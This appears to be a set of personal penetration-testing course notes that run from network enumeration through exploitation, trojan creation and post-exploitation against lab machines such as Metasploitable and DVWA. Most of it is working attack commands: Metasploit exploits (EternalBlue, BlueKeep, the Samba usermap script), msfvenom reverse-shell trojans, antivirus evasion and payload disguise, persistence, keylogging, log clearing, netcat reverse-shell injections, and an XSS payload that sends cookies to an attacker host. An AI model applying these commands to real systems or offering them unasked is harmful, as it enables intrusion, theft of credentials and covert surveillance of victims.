# Enumeration Toos

## Passive Enumeration

	$ whois <domain>

	$ whatweb <domain> -v , to grab headers, webserver version, IP, if redirect, etc


## Aggressive Enumeration

	$ whatweb 192.168.1.1-192.168.1.255 --aggression 3 -v --no-errors

	$ whatweb 192.168.1.1-192.168.1.255 --aggression 3 -v --no-errors --log-verbose=results.txt

	$ theHarvester -d <domain> -b all
	(-b for source of search | -l for limit that is set to 500 by default)
	[if it doesn't find any results, try again, after an hour, next day]

## hunter.io
An alternative to theHarvester


## sherlock

	- cd to the sherlock directory and run python3 sherlock.py (pip3 install torrequest)

	$ python3 sherlock.py <username> --output file.txt - will output all the platforms that has that username


## using the Scraper

	$ python3 scraper.py <domain>



# Scanning

Active information gathering

## netdiscover

	$ arp -a - doesn't find network hosts often

	$ netdiscover - will discover all hosts to a /16 network

	$ netdiscover -r <IP range> - will discover only hosts in a specific network


## nmap

	$ nmap -sn <target networl> - same functionality as netdiscover

	$ nmap <target IP/hostname/network> - basic scan 

	$ nmap -sS <target> - SYN scan

	$ nmap -sT <target> - three-way-handshake scan that runs without root priviledges

	$ nmap -O <target> - OS enumeration ; can help detect a honeypot (if it has a VM NIC)

	$ nmap -sV <target> - open ports software version enumeration

	$ nmap -sV --version-intensity 9 <target> - the default value is 7 ; a higher value will have a higher chance of detecting software versions but will need longer periods of time

	$ nmap -A <target> - will enable agressive features (scripts) - all the features listed above ; easily detectible and firewall might block this type of scan

	$ nmap -p <port, port> <target> - will scan only one port

	$ nmap -p- <target> - scans for all the ports

	$ nmap -F <target> - scans the first 100 popular ports

	$ nmap -sS <target> >> outputofscan.txt

	$ nmap -oN outputofscan -sS <target> - will have an output file saved and the resoults will also show on terminal

+ Firewall bypass scans

	$ nmap -f <target> - will fragment the SYN packet in 8 bytes ; most of time won't work

	$ nmap -D 10.0.0.1,10.0.0.10,10.0.0.100,ME <target> - will scan using decoy IP addresses including the real attacker machine 

	$ nmap -D RND:5 <target> - will scan with 5 different random IPs, including the real attacker machine

	$ nmap -S 8.8.8.8 -Pn -e eth0 -g 8888 <target> - will scan via 8.8.8.8 via a specific port ; the victim will respond to the spoofed IP

	$ nmap -sF -T<n> <target> - scan via FIN flag ; T0 and T1 are used for firewall bypass

	$ nmap -sV -p- -O -T4 <target>



# Vulnerability analysis

+ nmap scripts

	$ nmap --script-help firewall-bypass.nse - to see details of a script
	
	$ cd /usr/share/nmap/scripts/

	$ nmap --script auth <target> -sS - will find some vulnerabilities like default credentials (tomcat:tomcat)

	$ nmap --script malware <target> -sS - will detect if a target is infected with malware/backdoors

	$ nmap --script banner <target> -sS - banner grabbing of software versions

	$ nmap --script exploit <target> -sS - will actively try to exploit vulnerabilities

+ Manual vulnerability search

Process of searching Versions of software of a nmap scan

+ Searchsploit

	$ searchsploit OpenSSH 4.7p1 Debian 8ubuntu1

+ Nessus



# Exploitation

People are the weakest link in cybersecurity - Social Engineering

## Reverse shell & Bind shell

- Reverse shell - target machine connecting back to attacker machine - attacker opens a port

- Bind shell - attacker machine is connecting to the target machine - target opens a port


## Metasploit framework 

/usr/share/metasploit-framework/ - we have all the modules present in the framework: Auxiliary, Encoders, Evasion, Exploits, Nops, Payloads, Post


## Msfconsole commands

	$ msfconsole

	$ help

	$ ls

	$ cd 

	$ show payloads

	$ show exploits

	$ use <exploit/path>

	$ show info

	$ show payloads - when an exploit is selected, this command will list all the other associated payloads with the one selected

	$ show options

	$ set LHOST <attack-machine> - if metasploit fails to find IP address

	$ set payload <payload/path> - to change payload if another was selected

	$ show targets - will list the targets on which the exploit will run

	$ exploit - when all the parameters are set, will initiate the attack


## Hacking FTP (metasploitable)

	$ sudo nmap -sV 172.16.116.132

	$ searchsploit vsftp 2.3.4 

	$ msfconsole

	$ search vsftpd - copy the path

	$ use exploit/unix/ftp/vsftpd_234_backdoor

	$ show info

	$ show options

	$ set RHOSTS 172.16.116.132

	$ show payloads

	$ show targets

	$ exploit - hacked


## Misconfigurations (metasploitable)

Port 1524 - metasploitable root sheel - using netcat

	$ nc 172.16.116.132 1524 - hacked


## Information disclosure TELNET (metasploitable)

	$ telnet 172.16.116.132 - for banner grabbing and other information

	$ sudo su - msfadmin for root account


### Samba exploitation (metasploitable)

Ports 139, 445

	$ searchsploit samba

	$ search samba - to search for a SMB scanner (aux)

	$ use auxiliary/scanner/smb/smb_version

	$ options

	$ set RHOSTS 172.16.116.132

	$ exploit - Unix (Samba 3.0.20-Debian)

	$ searchsploit Samba 3.0.20

	$ use exploit/multi/samba/usermap_script - use open 4444 on the attacking machine

	$ set RHOSTS 172.16.116.132

	$ exploit - hacked


## SSH brute forcing (metasploitable)

	$ use auxiliary/scanner/ssh/ssh_login

	$ options - see the 'Required' section

	$ nano usernames.txt - create username list

	$ nano passwords.txt - create password list

	$ set PASS_FILE /home/hacker/Desktop/passwords.txt

	$ set USER_FILE /home/hacker/Desktop/usernames.txt

	$ set RHOSTS 172.16.116.132

	$ set VERBOSE true - to see even failed combinations attepmts

	$ run

	$ sessions - to see where we have a shell session ; session ID

	$ sessions -i 1 - will start interacting with the shell - hacked

	$ ssh msfadmin@172.16.116.132

/// test for other vulnerabilities 11.5


## Windows 7 exploitation

+ EternalBlue

--

	$ use auxiliary/scanner/smb_ms17_010 -  to see if our target is vulnerable to EternalBlue

	$ set RHOSTS 172.16.116.13x

	$ run

	$ search eternalblue

	$ use exploit/windows/smb/ms17_010_eternalblue - it will default to x64 architecture

	$ set payload windows/meterpreter/reverse_tcp

	$ show options

	$ set RHOSTS 172.16.166.13x

	$ run

	> getuid - SYSTEM - highest level account in windows (meterpreter shell)

+ Double Pulsar attack

-- bit better exploit for both x64 and x32 Windows architectures ; we need to download the exploit because it's not present in Metasploit
	
	$ dpkg --add-architecture i386 && apt update && apt install wine32

	$ wine msiexec /i python-2.7.14.msi - execute as root ; download python 2.7.14 x86 msi (last one)

	$ ls -la - check the existance of .wine 

	$ git clone Eternalblue Doublepulsar and cd into the directory

	$ cp deps/ /usr/share/metasploit-framework/modules/exploits/windows/smb -r

	$ cp eternalblue_doublepulsar.rb/ /usr/share/metasploit-framework/modules/exploits/windows/smb

	$ use explots/windows/smb/eternalblue_doublepulsar

	$ show info

	$ set PROCESSINJECT lsass.exe - because we need to switch to x64

	$ set RHOSTS 172.16.116.133

	$ set TARGETARCHITECTURE x64

	$ set payload windows/x64/meterpreter/reverse_tcp

	$ show targets

	$ exploit

 	> shell

+ BlueKeep

-- RDP vulnerability

	$ nmap -sS 172.16.116.133 - to check if RDP 3389 is open

	$ msfconsole

	$ search bluekeep

	$ use auxiliary/scanner/rdp/cve_2019_0708_bluekeep

	$ show info

	$ options

	$ set RHOSTS 172.16.116.133

	$ exploit - see if target is vulnerable

	$ use exploit/windows/rdp/cve_2019_0708_bluekeep_rce

	$ show info

	$ show options

	$ set RHOSTS 172.16.116.133

	* the exploit will use by default a reverse tcp shell ; also, targets are only Win7 x64 OS ; should select the type of machine

	$ set target 2 - bacause it's on a VM

	$ exploit

	> - meterpreter shell open


## Routersploit

-- hacking routers

	$ clone routersploit and install requiered packages

	$ python3 rsf.py

	$ use scanners/autopwn - will check for all present vulnerabilities

		[-] - not vulnerable
		[*] - cannot be verified
		[+] - is vulnerable

	$ show options

	$ set target 192.168.0.1

	$ run


## SMBGhost Windows10

+ CVE-2020-0796 

--- only SMB is needs to be open on the machine

	$ nmap -sS 172.16.116.134

	$ locate cve-2020-0796 - will display that nessus has the plugin for the vulnerability

	$ clone a scanner https://github.com/ButrintKomoni/cve-2020-0796

	$ python3 cve-2020-0796-scanner.py 172.16.116.134 - will show 'Vulnerable'

	$ clone https://github.com/jiansiting/CVE-2020-0796 - vulnerability that will crash any Windows 10 machine

	$ python3 cve-2020-0796.py 172.16.116.134 - will only work if Firewall is OFF

+ Gaining Shell 

-- remote exploitation POC

	$ git clone https://github.com/ZecOps/CVE-2020-0796-RCE-POC

	* clone de repository on the target machine in order to find the specific Offsets on the machine

	* run the .bat file - to check the Offsets on the specific machine

	$ nc -lvp 4444 - open a listening port on the attacking machine

	$ python3 SMBleedingGhost.py 172.16.116.134 172.16.116.130 4444 - needs be ran on another Windows machine (windll error) - it might crash for a couple of times until it will grand SYS privileges on the Kali machine



# Malware generation (trojans)

## Msfvenom

	$ cd Desktop

	$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.116.130 LPORT=4444 -f exe -o myshell.exe

	* copy the payload to the target machine

	$ msfconsole

	$ use exploit/multi/handler - setting up a listener

	$ set payload windows/x64/meterpreter/reverse_tcp - must match with the payload in the generated exploit

	$ set LHOST 172.16.116.130 

	$ set LPORT 4444 - it defaults to 4444 but just in case

	$ run - the listener is set up

	> run myshell.exe - will give a shell


## Advanced Msfvenom

	$ msfvenom -h - for help

	$ msfvenom --list formats - to see all of the available formats for malware creation

	* upload to virustotal.com to compare created malware signatures

	$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.116.130 LPORT=4444 -a x64 -e x64/zutto_dekiru -i 3 --platform windows -n 500 -f exe -o shell.exe - -a select architecture ; -e select encoding method; -i number of iterations; -n length of NOPsled; -f select type of format; -o input output file

	$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.116.130 LPORT=4444 -x putty.exe -f exe -o Putty.exe - will mask the payload under a specific template ; must be in the same directory of the output file ; can bypass some antiviruses

	* a .py payload file will not be detectable by antiviruses, but can be difficult to run on target


## Veil

	$ apt install veil

	$ veil - similar to msfvenom ; Evasion and Ordnance

	$ use 1 - to select Evasion

	$ list - to see payloads (41)

	$ use 22 - reverse_tcp.py

	$ set SLEEP 20 - malware will sleep for 20s after execution and after will establish a connection

	$ set LHOST 172.16.116.130

	$ generate

	$ payload - will ask for the name of the output file

	* will output a .bat file that we need to convert to .exe

	* git clone https://github.com/tokyoneon/B2E

	* use wine to execute Bat_To_Exe_Converter_(Installer).exe 
	* in Veil, there will be generated a second path for the metasploit framework ; copy the path and run

		$ msfconsole

		$ resource /path/from/veil - will enable the listener automatically on the attacker machine

	* the payload.exe will have a detection rate at about 30-40%, a bit lower than msfvenom


## TheFatRat

	$ git clone https://github.com/Screetsec/TheFatRat

	$ cd TheFatRat

	$ chmod +x setup.sh && ./setup.sh

	$ fatrat - DO NOT UPLOAD TO VIRUSTOTAL

	$ 6 - select any other options

	$ 2 - create an .exe file with C# and Powershell FUD (fully undetectable)

	* set local host

	* set listening port

	* select output file name

	* select payload

	* /root/Fatrat_Generated/createexploit.exe - path to exploit

	* the listener wasn't automatically generated - use msfconsole


## AV bypass

A bypass won't last forever

Rules to bypass AV:

	- code your own exploits - need to know a programming language

	- hide malware signatures via Hexeditor

	- implement execution retardation 

+ Hexeditor

	$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.116.130 LPORT=5555 -f exe -o shell.exe - create a payload

	$ md5sum shell.exe - the hash is what that is being stored into a AV DB, so changing the hash could make the payload undetectable

	$ hexeditor shell.exe - will open the payload binary

	* change the HEX values of the string: 'This program cannot be run in DOS mode', 'text'

	* changing other hex bytes can crash the program

	* CTRL+O for save

	* check the md5 hash again - it should change 


## Payload masking

	* ping to ico converter on Google

	* .ico is the output

	* select both files and 'Add to Archive' and change the name - will be output an .exe file

	* General > rename.exe

	* Advanced > Advanced SFX > Update > select Extract and update files ; and Overwrite all files | Text and Icon > Load an SFX icon from the file > select the .ico file | Modes > Hide all ; Unpack to temporary folder | Setup > Run after extraction > car.png shell.exe | 



# Post exploitation

- look at files

- steal passwords

- hack the network

- keylog systems


## Meterpreter basic commands

-- core commands

	$ help 

	$ background - aka bg, if there is a session opened, we can put the session in the background without exiting from it ; allows for switching sessions

	$ getuid

	$ pwd

	$ dir or ls - supports both Windows and Linux commands for listing directories

	$ cat - print file content

	$ cd and cd .. - switch to and backwords a directory

	$ download passwords.txt - by default meterpreter downloads files to the Desktop

	$ upload ratbackdoor.exe - can also upload other tools

	$ shell - will execute the uploaded file

	$ rmdir or rm - to delete a directory or file

	$  cp password.txt TestDirectory - to copy a file into a specific directory - if not working, Priviledge Escalation might be needed

	$ arp - see arp table

	$ ifconfig - see network interfaces

	$ netstat - will print all the connections that the target system currently has

-- system commands

	$ execute -f calc - to start the calculator on target ; will show the Process ID

	$ ps - will list all the processes running on target

	$ kill 8412 - kill a Process ID

	$ reboot

	$ shutdown

	$ sysinfo - retrieves information about the target system

	$ mouse move 640 860 - controle mouse pointer position

	$ keyscan_start - will start logging key strokes

	$ keyscan_dump - dumps logged keystrokes

	$ keyscan_stop - stops capturing keystrokes

	$ screenshot - will grab and save a screenshot of the target system ; will save in /root on attacker system

	$ screenshare - see remote desktop in realtime ; will stream the target desktop ; can be buggy

	$ record_mic -d 10 - will record microfone for 10s and will save in /root

	$ getsystem - will attempt to get System privileges - will fail most of the time

	$ hashdump - will dump SAM hashes


## Privilege escalation Windows

	$ msfconsole

	$ search bypassuac - will show all User Account Bypasses that are available ; most of them were patched but for an outdated system will work

	$ search 2020 - list all modules of the year 2020

	* we are searching for a /local/ exploit for priviledge escalation

	$ use exploit/windows/local/cve_2020_0668_service_tracing

	$ show info

	$ options

	$ sessions

	$ set SESSION 1

	$ run - must run exploit on different PORT if we have another session running


## Persistence

Adding a process to startup so we can gain access again after system shutdown

	$ systemctl start apache2 - will start an Apache web server on attacking machine

	$ cd /var/www/html - delete contents and put the payload in the directory

	> navigate to the IP address of the attacker machine and download the payload

	$ msfconsole

	* start handler on the attacking machine

	$ search persistence

	$ use exploit/windows/local/persistence_service

	$ show info - will upload an executable and give  persistence

	* we need System privileges before executing persistence

	$ set SESSION 2 - select the session with SYSTEM level

	$ set RETRY_TIME 10 - the default is 5 seconds 

	$ run

	> getuid - SYSTEM and will connect back when the target is back online

	$ select exploit/multi/handler

	$ set LPORT 4444 - the port on which the persistence module is set and wait for the target to connect back

	$ run

	$ bg - to run it in the background


## Post exploitation modules

-- note: we are on the target system

	> search -f *.jpg - will search the target for jpg files

	> bg

	$ search post/windows

	$ use post/windows/wlan/wlan_profile - will list all the wireless profiles and passwords

	$ show options

	$ set SESSION 1 

	* there are lots of enumeration tools, check out hashdump (post/windows/gather/hashdump)

	> clearev - will clear all logged events on the target

	> run post/windows/gather/enum_applications - we can run payloads directly from the target without putting the session in background



# Web application penetration testing

## Information gathering

	- visit the IP/host and search the web pages and inputs

	$ dirb http://172.16.116.132 - will enumerate all the web app directories via built-in wordlist

	* use enumeration tools from the section

	* search Github for other tools


## Shellshock

This vulnerability was patched and no longer in the wild

	- () { :;}; - syntax of an empty function

	- () { :;}; /bin/bash -c 'nc 172.16.116.130 1234 -e /bin/bash'

	$ nc -lvp 1234

	* this can be ran directly from msfconsole - exploit/multi/http/apache_mod_cgi_bash_env_exec and set RHOSTS and TARGETURI

	
## Command injection (DVWA)

-- Low security

	$ 172.16.116.130; ls

	$ 172.16.116.130; nc -e /bin/bash 172.16.116.130 1234 - set up the listener 'nc -lvp 1234'

	$ cd ..

	$ cd ..

	$ cat /etc/passwd

	* see source code

-- Medium security

	$ 172.16.116.130 & nc -e /bin/bash 172.16.116.130 1234 - '&& and ; are filtered'

	* review source code

	$ 172.16.116.130 | nc -e /bin/bash 172.16.116.130 1234

-- High security

It will filter out any command injection


## Meterpreter shell (DVWA)

-- payload creation with python

	$ cd Desktop

	$ msfvenom -p python/meterpreter/reverse_TCP LHOST=172.16.116.130 LPORT=1234 >> tester.py

	$ service apache2 start - start webserver on the attack machine

	$ cp dvwa-shell.py /var/www/html

	$ msfconsole

	$ use exploit/multi/handler

	$ set LHOST 172.16.116.130

	$ set LPORT 1234

	$ run

	> & wget 172.16.116.130/dvwa-shell.py & python dvwa-shell.py


## XSS

- Reflected

-- Low security

	> <script>alert('1'),</script> - will generate an alert with message '1'

	* analyze source code

-- Medium security

	> <SCRIPT>alert('1')</SCRIPT>

	> <scr<script>ipt>alert('1'),</script>

- Cookie stealing 

	$ python -m SimpleHTTPServer 1234

	$ <SCRIPT>document.write('<img src=http://172.16.116.130:1234/' + document.cookie + ' ">');</script>

- Stored

-- Low security

	$ <script>alert('1'),</script>

-- Medium security

	- htmlspecialchars($name) is the function that strips all illegal HTML charactes

	- 'Name' input can be changed from 10 to 100 input characters in order to bypass security

	$ <SCRIPT>alert('alert')</script>


## HTML injection

Like XSS but injecting HTML code in the Reflected XSS section

HTML injection can modify HTML code of page at liking

	$ <h1>Test</h1>

	<meta http-equiv="refresh" content=0; url=http://google.com" />


## SQL injection

-- Low security

	$ 2' and '1'='1

	$ 2' order by 1 --'

	9.30